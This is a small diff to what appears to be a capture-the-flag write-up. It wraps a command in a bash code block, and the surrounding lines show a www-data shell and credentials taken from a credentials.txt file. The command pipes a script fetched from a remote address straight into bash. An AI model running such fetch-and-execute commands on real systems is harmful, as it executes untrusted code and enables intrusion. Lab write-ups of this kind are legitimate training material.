@@ -33,7 +33,9 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 User on the box and in `credentials.txt`: `think : nopassword`
 
+```bash
 curl http://10.8.28.13:8000/moo.sh | bash
+```
 
 
 ## USER
